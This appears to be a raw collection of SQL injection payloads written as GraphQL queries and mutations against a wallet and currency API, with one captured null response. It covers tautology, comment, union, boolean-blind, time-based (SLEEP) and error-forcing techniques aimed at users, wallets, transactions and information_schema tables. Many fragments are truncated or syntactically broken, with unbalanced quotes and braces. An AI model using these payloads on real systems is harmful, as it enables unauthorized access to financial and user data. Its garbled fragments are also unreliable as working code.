------------------Payload:-------------------

// Tautology-based Injection
{
  getWallet(walletID: "' OR '1'='1") {
    id
    name
    balance
  }
}

// Comment Injection
{
  getWallet(walletID: "-- ' OR 1=1") {
    id
    name
    balance
  }
}

// Union-based Injection
{
  getWallet(walletID: " UNION SELECT name FROM information_schema.tables") {
    id
    name
    balance
  }
}

// Boolean-based Blind Injection
{
  getWallet(walletID: " AND EXISTS (SELECT 1 FROM information_schema.tables)") {
    id
    name
    balance
  }
}

// Time-based Blind Injection
{
  getWallet(walletID: " AND SLEEP(5)") {
    id
    name
    balance
  }
}

// Force Errors for Debugging
{
  getWallet(walletID: " OR 1/0") {
    id
    name
    balance
  }
}

// Extracting Metadata
{
  getWallet(walletID: " AND EXTRACT(MONTH FROM NOW())=1") {
    id
    name
    balance
  }
}

  createCurrency(
    abbreviation: "USD' OR 1=1 --"

mutation {
  createCurrency(
    abbreviation: "USD' --" OR country = 'United States'
    country: "United States"
    symbol: "$"
  ) {
    id
    abbreviation
    symbol
    rate
    country
  }
}

    abbreviation: "USD' AND 0=1 --"

    abbreviation: "1 OR 1=2"
    country: "FFG0FI9Q6M"
    symbol: "' OR 'JQH21EA80A'"='JQH21EA80A'--"
  ) {
    id
    abbreviation
    symbol
    rate
    country
  }
}

mutation {
  updateUser(
    userID: "f7ba34ee-f99a-4a2c-aa20-42dd31a30e3e"
    description: "_1=1" // Tautology-based Injection
    firstName: "I82Z5Z8Q8T"
    lastName: "XLDHVX3JX3"
  ) {
    id
    firstName
    lastName
    description
  }
}

or

mutation {
  updateUser(
    userID: "f7ba34ee-f99a-4a2c-aa20-42dd31a30e3e"
    description: "-- AND 1=0" // Comment Injection
    firstName: "I82Z5Z8Q8T"
    lastName: "XLDHVX3JX3"
  ) {
    id
    firstName
    lastName
    description
  }
}

or

mutation {
  updateUser(
    userID: "' OR '1'='1" UNION SELECT NULL, NULL // Union-based Injection
    firstName: "I82Z5Z8Q8T"
    lastName: "XLDHVX3JX3"
  ) {
    id
    firstName
    lastName
    description
  }
}

or

mutation {
  updateUser(
    userID: " AND CHAR_LENGTH(@@version)>0" // Boolean-based Blind Injection
    firstName: "I82Z5Z8Q8T"
    lastName: "XLDHVX3JX3"
  ) {
    id
    firstName
    lastName
    description
  }
}

or

mutation {
  updateUser(
    userID: " SLEEP(10)" // Time-based Blind Injection
    firstName: "I82Z5Z8Q8T"
    lastName: "XLDHVX3JX3"
  ) {
    id
    firstName
    lastName
    description
  }
}

or

mutation {
  updateUser(
    userID: " AND 1/0" // Force Errors for Debugging
    firstName: "I82Z5Z8Q8T"
    lastName: "XLDHVX3JX3"
  ) {
    id
    firstName
    lastName
    description
  }
}

// Tautology-based Injection
{
  getLocation(locationID: "' OR 1=1 --') {
    id
    name
  }
}

// Comment Injection
{
  getLocation(locationID: "' --') {
    id
    name
  }
}

// Union-based Injection
{
  getLocation(locationID: "' UNION SELECT 'test' FROM users --') {
    id
    name
  }
}

// Boolean-based Blind Injection
{
  getLocation(locationID: "' AND EXISTS (SELECT 1 FROM users) --') {
    id
    name
  }
}

// Time-based Blind Injection
{
  getLocation(locationID: "' AND SLEEP(5) --') {
    id
    name
  }
}

// Force Errors for Debugging
{
  getLocation(locationID: "' OR 'a'='a --') {
    id
    name
  }
}

// Extracting Metadata
{
  getLocation(locationID: "' AND schema_name('users') --') {
    id
    name
  }
}

query {
  getWallet(walletID: "c1f5b937-3192-4da5-a89f-477359241882 OR 1=1") {
    user {
      id
      firstName
      lastName
      description
      wallets {
        id
        name
        balance
      }
    }
  }
}

------------------Response:-------------------
{"data":{"getWallet":null}}

  }
}

  createTransaction(
    amount: "604.8443084681913' AND (SELECT COUNT(*) FROM dual) > 0 --"
  ) {
    id
    amount
    rate
    description
    timestamp
  }
}

------------------Payload:-------------------

mutation {
  createTransaction(
    amount: 604.8443084681913
    currencyID: "ebf9bc53-148e-44b4-a0ce-ac57453ace50"
    payerID: "A21PAOQ4VL'
    OR 1=1 -- "
    walletID: "9a65df56-3196-4059-b5a3-d9737a13331e"
  ) {
    id
    amount
    rate
    description
    timestamp
  }

mutation {
  createCurrency(
    abbreviation: "' OR '=true --"
    country: "DXRV1GUV7T"
    symbol: "C17CPXNYBZ"
  ) {

    symbol
    rate
    country
  }
}

  createCurrency(
    abbreviation: "' /*"
    country: "DXRV1GUV7T"
    symbol: "C17CPXNYBZ"
  ) {

    abbreviation
    symbol
    rate
    country
  }
}

  createCurrency(
    abbreviation: "' UNION SELECT NULL --"

    symbol: "C17CPXNYBZ"
  ) {

    symbol
    rate
    country
  }
}

// Tautology-based Injection
{
  s: getWallets(where: {name: "' OR 1=1"}) {
    id
    name
    balance
  }
}

// Comment Injection
{
  s: getWallets(where: {name: "' -- testing comment injection'}) {
    id
    name
    balance
  }
}

// Union-based Injection (note: this might not work as expected due to GraphQL's query flattening)
{
  s: getWallets(where: {name: "' UNION ALL SELECT * FROM users, '}) {
    id
    name
    balance
  }
}

// Boolean-based Blind Injection
{
  s: getWallets(where: {name: "' AND 1=0 OR name LIKE 'test%''}) {
    id
    name
    balance
  }
}

// Time-based Blind Injection (note: this might not work as expected due to GraphQL's query flattening)
{
  s: getWallets(where: {name: "' AND SLEEP(3) AND name LIKE 'test%''}) {
    id
    name
    balance
  }

// Tautology-based Injection
{
  getUser(userID: "' OR '1'='1") {
    wallets {
      id
      transactions {
        id
        amount
        rate
        timestamp
      }
    }
  }
}

// Comment Injection
{
  getUser(userID: "' -- ") {
    wallets {
      id
      transactions {
        id
        amount
        rate
        timestamp
      }
    }
  }
}

// Union-based Injection
{
  getUser(userID: "' UNION SELECT NULL, NULL FROM information_schema.columns") {
    wallets {
      id
      transactions {
        id
        amount
        rate
        timestamp
      }
    }
  }
}

// Boolean-based Blind Injection
{
  getUser(userID: "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0") {
    wallets {
      id
      transactions {
        id
        amount
        rate
        timestamp
      }
    }
  }
}

// Time-based Blind Injection
{
  getUser(userID: "' AND EXTRACT(MINUTE FROM CURRENT_TIMESTAMP) > 0") {
    wallets {
      id
      transactions {
        id
        amount
        rate
        timestamp
      }
    }
  }
}
